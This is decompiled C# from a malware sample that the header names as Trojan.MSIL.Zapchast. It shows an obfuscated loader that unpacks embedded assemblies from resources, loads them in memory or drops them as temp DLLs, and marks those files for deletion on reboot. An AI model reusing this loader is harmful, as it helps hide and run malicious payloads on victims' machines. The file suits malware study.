// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ShockService, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 734F9505-CACA-4A59-B5D4-1A5D344BA700
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.f-c4ed3f98e55a24fcbd24b3149b62fe11af1937ebb7bdff7532ea16b26f67a0ed.exe

using \u0004;
using \u0005;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u0004
{
  internal sealed class \u0002
  {
    internal const string \u0001 = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0002 = 4;
    private static Hashtable \u0003 = new Hashtable();

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0001(string existingFileName, string newFileName, int flags);

    internal static bool IsWebApplication
    {
      get
      {
        bool flag;
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (true)
          {
            int num = lower == "w3wp.exe" ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                if (true)
                {
                  flag = true;
                  goto label_12;
                }
                else
                  goto label_12;
              }
              else
                num = lower == "aspnet_wp.exe" ? 1 : 0;
            }
            if (num != 0)
            {
              flag = true;
              goto label_12;
            }
          }
        }
        catch
        {
        }
label_10:
        return false;
label_12:
        if (true)
        {
          int num = flag ? 1 : 0;
          return false ? num != 0 : num != 0;
        }
        goto label_10;
      }
    }

    internal static void \u0001()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0002.\u0001);
      }
      catch
      {
      }
    }

    internal static Assembly \u0001(object sender, ResolveEventArgs e)
    {
      \u0002.\u0001 obj = new \u0002.\u0001(e.Name);
      string str1 = obj.\u0001(false);
      string s;
      if (true)
        s = str1;
      string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
      string[] strArray;
      if (true)
        strArray = "e2VhNDgwNTk1LTE4Y2ItNGQ4MC04MzA3LWZmMDRlMzRkNGQ1ZX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{45894304-b2d0-45a1-a936-fdba0095f1dc}".Split(',');
      string str2 = string.Empty;
      bool flag1 = false;
      int num1 = 0;
      bool flag2;
      int num2;
      while (true)
      {
        flag2 = num1 != 0;
        int index1 = 0;
label_8:
        for (; index1 < strArray.Length - 1; index1 += 2)
        {
          if (strArray[index1] == base64String)
            goto label_6;
        }
        goto label_9;
label_6:
        str2 = strArray[index1 + 1];
label_9:
        int index2;
        if (str2.Length == 0 && obj.\u0004.Length == 0)
        {
          base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
          index2 = 0;
          goto label_14;
        }
        else
          goto label_15;
label_13:
        index2 += 2;
label_14:
        if (index2 < strArray.Length - 1)
        {
          if (strArray[index2] == base64String)
          {
            str2 = strArray[index2 + 1];
            if (false)
              goto label_8;
          }
          else
            goto label_13;
        }
label_15:
        if (true)
        {
          if (str2.Length > 0)
          {
            int num3 = (int) str2[0];
            if (false)
              num1 = num3;
            else if (num3 == 91)
            {
              num2 = str2.IndexOf(']');
              string str3 = str2.Substring(1, num2 - 1);
              flag1 = str3.IndexOf('z') >= 0;
              flag2 = str3.IndexOf('t') >= 0;
              if (false)
                goto label_6;
              else
                break;
            }
            else
              goto label_21;
          }
          else
            goto label_41;
        }
        else
          goto label_13;
      }
      str2 = str2.Substring(num2 + 1);
label_21:
      Hashtable hashtable;
      Monitor.Enter((object) (hashtable = \u0002.\u0003));
      try
      {
        if (\u0002.\u0003.ContainsKey((object) str2))
          return (Assembly) \u0002.\u0003[(object) str2];
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str2);
        if (manifestResourceStream != null)
        {
          int length = (int) manifestResourceStream.Length;
          byte[] numArray = new byte[length];
          manifestResourceStream.Read(numArray, 0, length);
          if (flag1)
            numArray = \u0003.\u0001(numArray);
          Assembly assembly;
          do
          {
            assembly = (Assembly) null;
            if (!flag2)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                flag2 = true;
              }
              catch (BadImageFormatException ex)
              {
                flag2 = true;
              }
            }
            if (flag2)
            {
              try
              {
                string str4 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str2);
                do
                {
                  Directory.CreateDirectory(str4);
                  string str5 = str4 + obj.\u0001 + ".dll";
                  if (!File.Exists(str5))
                  {
                    FileStream fileStream = File.OpenWrite(str5);
                    fileStream.Write(numArray, 0, numArray.Length);
                    fileStream.Close();
                    \u0002.\u0001(str5, (string) null, 4);
                    \u0002.\u0001(str4, (string) null, 4);
                  }
                  assembly = Assembly.LoadFile(str5);
                }
                while (false);
              }
              catch
              {
              }
            }
          }
          while (false);
          \u0002.\u0003[(object) str2] = (object) assembly;
          return assembly;
        }
      }
      finally
      {
        do
        {
          Monitor.Exit((object) hashtable);
        }
        while (false);
      }
label_41:
      return (Assembly) null;
    }

    internal struct \u0001
    {
      public string \u0001;
      public Version \u0002;
      public string \u0003;
      public string \u0004;

      public string \u0001(bool includeVersion)
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(this.\u0001);
        if (true)
          goto label_8;
label_5:
        if (true)
        {
          stringBuilder.Append(this.\u0003.Length == 0 ? "neutral" : this.\u0003);
          stringBuilder.Append(", PublicKeyToken=");
          stringBuilder.Append(this.\u0004.Length == 0 ? "null" : this.\u0004);
        }
        return stringBuilder.ToString();
label_8:
        int num;
        for (int index = includeVersion ? 1 : 0; index != 0; index = num)
        {
          num = this.\u0002 != (Version) null ? 1 : 0;
          if (true)
          {
            if (num != 0)
            {
              stringBuilder.Append(", Version=");
              stringBuilder.Append((object) this.\u0002);
              break;
            }
            break;
          }
        }
        stringBuilder.Append(", Culture=");
        goto label_5;
      }

      public \u0001(string assemblyFullName)
      {
        this.\u0002 = (Version) null;
        this.\u0003 = string.Empty;
        this.\u0004 = string.Empty;
        this.\u0001 = string.Empty;
        string str1 = assemblyFullName;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (str3.StartsWith("Version="))
            this.\u0002 = new Version(str3.Substring(8));
          else if (str3.StartsWith("Culture="))
          {
            this.\u0003 = str3.Substring(8);
            if (this.\u0003 == "neutral")
              this.\u0003 = string.Empty;
          }
          else if (str3.StartsWith("PublicKeyToken="))
          {
            this.\u0004 = str3.Substring(15);
            if (this.\u0004 == "null")
              this.\u0004 = string.Empty;
          }
          else
            this.\u0001 = str3;
        }
      }
    }
  }
}
